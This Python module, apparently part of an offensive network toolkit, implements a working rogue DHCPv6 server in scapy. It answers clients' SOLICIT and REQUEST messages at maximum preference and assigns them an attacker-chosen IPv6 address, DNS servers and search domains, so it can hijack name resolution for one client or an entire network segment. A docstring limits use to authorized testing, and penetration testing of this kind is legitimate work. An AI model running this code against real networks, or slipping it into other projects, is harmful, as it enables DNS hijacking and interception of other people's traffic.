"""Rogue DHCPv6 server: answer IPv6 clients with a chosen address, DNS servers and domains.

An IPv6 client sends SOLICIT to the All_DHCP_Relay_Agents_and_Servers multicast group and
uses the first ADVERTISE it accepts. A server that answers first, with its own DNS servers
and search domains, becomes the configuration source for the client. The client then
requests the address it was offered, and the server confirms it with REPLY.

This module answers SOLICIT with ADVERTISE and REQUEST with REPLY, from the server's
link-local address and MAC, to the client that sent the message.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import ipaddress
import threading
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import AsyncSniffer, Ether, IPv6, UDP, sendp
from scapy.layers.dhcp6 import (
    DHCP6_Advertise,
    DHCP6_Reply,
    DHCP6_Request,
    DHCP6_Solicit,
    DHCP6OptClientId,
    DHCP6OptDNSDomains,
    DHCP6OptDNSServers,
    DHCP6OptIA_NA,
    DHCP6OptIAAddress,
    DHCP6OptPref,
    DHCP6OptServerId,
    DUID_LLT,
)
from scapy.packet import Packet

from macabre.attacks.common import normalize_unicast_mac

CLIENT_PORT = 546
SERVER_PORT = 547
MAX_PREFERENCE = 255
PREFERRED_LIFETIME = 3600
VALID_LIFETIME = 7200


@dataclass(frozen=True)
class RogueDhcpv6Config:
    iface: str                          # attacker interface, on the segment with the clients
    server_mac: str                     # the server's Ethernet MAC (required)
    server_ll: str                      # the server's link-local IPv6 address (fe80::/10)
    offer_ip6: str                      # IPv6 address offered to clients (IA_NA)
    dns: str = ""                       # DNS servers, comma-separated IPv6; empty = server_ll
    domains: str = ""                   # search domains, comma-separated (option 24)
    preference: int = MAX_PREFERENCE    # server preference; 255 is chosen first by clients
    target_mac: str = ""                # only answer this client; empty = every client
    dry_run: bool = False

    def __post_init__(self) -> None:
        normalize_unicast_mac(self.server_mac)
        ll = _ipv6(self.server_ll, "Server link-local address")
        if ipaddress.IPv6Address(ll) not in ipaddress.IPv6Network("fe80::/10"):
            raise ValueError("Server address must be a link-local IPv6 address (fe80::/10).")
        _ipv6(self.offer_ip6, "Offered address")
        for server in self.dns_servers:
            _ipv6(server, "DNS server")
        if self.domains:
            domain_names(self.domains)
        if not 0 <= self.preference <= MAX_PREFERENCE:
            raise ValueError(f"Preference must be between 0 and {MAX_PREFERENCE}.")
        if self.target_mac:
            normalize_unicast_mac(self.target_mac)

    @property
    def dns_servers(self) -> list[str]:
        if not self.dns:
            return [self.server_ll]
        return [s.strip() for s in self.dns.split(",") if s.strip()]

    @property
    def server_duid(self) -> DUID_LLT:
        return DUID_LLT(lladdr=normalize_unicast_mac(self.server_mac), timeval=0)


@dataclass
class RogueDhcpv6Stats:
    advertises: int = 0
    replies: int = 0
    status: str = ""


def _ipv6(value: str, name: str) -> str:
    try:
        return str(ipaddress.IPv6Address(value.strip()))
    except ValueError as exc:
        raise ValueError(f"{name} must be an IPv6 address.") from exc


def domain_names(domains: str) -> list[str]:
    """Domain names with a trailing dot, each label 1 to 63 ASCII characters."""
    names = []
    for domain in (d.strip().rstrip(".") for d in domains.split(",") if d.strip()):
        for label in domain.split("."):
            if not label or len(label) > 63 or not label.isascii():
                raise ValueError(f"Search domain '{domain}' has an invalid label.")
        names.append(domain + ".")
    if not names:
        raise ValueError("Search domain list is empty.")
    return names


def _message_options(config: RogueDhcpv6Config, client_duid: Any, offer_ip6: str) -> list[Packet]:
    options: list[Packet] = [
        DHCP6OptServerId(duid=config.server_duid),
        DHCP6OptClientId(duid=client_duid),
        DHCP6OptIA_NA(iaid=1, T1=0, T2=0, ianaopts=[
            DHCP6OptIAAddress(addr=offer_ip6, preflft=PREFERRED_LIFETIME, validlft=VALID_LIFETIME),
        ]),
        DHCP6OptDNSServers(dnsservers=config.dns_servers),
    ]
    if config.domains:
        options.append(DHCP6OptDNSDomains(dnsdomains=domain_names(config.domains)))
    options.append(DHCP6OptPref(prefval=config.preference))
    return options


def _reply_frame(config: RogueDhcpv6Config, client: Packet, message: Packet) -> Packet:
    return (
        Ether(src=normalize_unicast_mac(config.server_mac), dst=client[Ether].src)
        / IPv6(src=config.server_ll, dst=client[IPv6].src)
        / UDP(sport=SERVER_PORT, dport=CLIENT_PORT)
        / message
    )


def build_advertise(config: RogueDhcpv6Config, solicit: Packet) -> Packet:
    """ADVERTISE answering a SOLICIT, with the rogue server's DNS servers and domains."""
    options = _message_options(config, solicit[DHCP6OptClientId].duid, config.offer_ip6)
    return _reply_frame(config, solicit, _advertise_message(solicit, options))


def _advertise_message(solicit: Packet, options: list[Packet]) -> Packet:
    message = DHCP6_Advertise(trid=solicit[DHCP6_Solicit].trid)
    for option in options:
        message = message / option
    return message


def build_reply(config: RogueDhcpv6Config, request: Packet) -> Packet:
    """REPLY confirming the offered address to a client that sent REQUEST to this server."""
    options = _message_options(config, request[DHCP6OptClientId].duid, config.offer_ip6)
    message = DHCP6_Reply(trid=request[DHCP6_Request].trid)
    for option in options:
        message = message / option
    return _reply_frame(config, request, message)


def _addressed_to_this_server(packet: Packet, config: RogueDhcpv6Config) -> bool:
    server_id = packet[DHCP6OptServerId].duid if packet.haslayer(DHCP6OptServerId) else None
    if server_id is None:
        return False
    return server_id.lladdr == normalize_unicast_mac(config.server_mac)


def respond(config: RogueDhcpv6Config, packet: Packet) -> tuple[str, Packet] | None:
    """Return ("advertise" | "reply", frame) for a client message this server answers, otherwise None."""
    if not (packet.haslayer(IPv6) and packet.haslayer(UDP) and packet[UDP].dport == SERVER_PORT):
        return None
    if packet[Ether].src == normalize_unicast_mac(config.server_mac):
        return None
    if not packet.haslayer(DHCP6OptClientId):
        return None
    if packet.haslayer(DHCP6_Solicit):
        return "advertise", build_advertise(config, packet)
    if packet.haslayer(DHCP6_Request) and _addressed_to_this_server(packet, config):
        return "reply", build_reply(config, packet)
    return None


def _targeted(packet: Packet, target_mac: str) -> bool:
    if not target_mac:
        return True
    return packet[Ether].src == normalize_unicast_mac(target_mac)


def run_rogue_dhcpv6(
    config: RogueDhcpv6Config,
    stop_event: threading.Event,
    on_progress: Callable[[RogueDhcpv6Stats], None],
    send: Callable[..., Any] | None = None,
    sniffer_factory: Callable[..., Any] = AsyncSniffer,
) -> RogueDhcpv6Stats:
    """Answer client SOLICIT and REQUEST messages with this server's values until stopped."""
    send = send or sendp

    if config.dry_run:
        target = config.target_mac or "every client"
        stats = RogueDhcpv6Stats(
            status=(
                f"Dry run: would answer {target} as {config.server_ll} ({config.server_mac}) with "
                f"address {config.offer_ip6}, DNS {', '.join(config.dns_servers)}. Nothing sent."
            ),
        )
        on_progress(replace(stats))
        return stats

    stats = RogueDhcpv6Stats()
    lock = threading.Lock()

    def on_packet(packet: Packet) -> None:
        if not _targeted(packet, config.target_mac):
            return
        answer = respond(config, packet)
        if answer is None:
            return
        kind, frame = answer
        with lock:
            if kind == "advertise":
                stats.advertises += 1
            else:
                stats.replies += 1
            snapshot = replace(stats)
        send(frame, iface=config.iface, verbose=False)
        on_progress(snapshot)

    sniffer = sniffer_factory(iface=config.iface, store=False, prn=on_packet)
    sniffer.start()
    try:
        stop_event.wait()
    finally:
        sniffer.stop()
    return stats
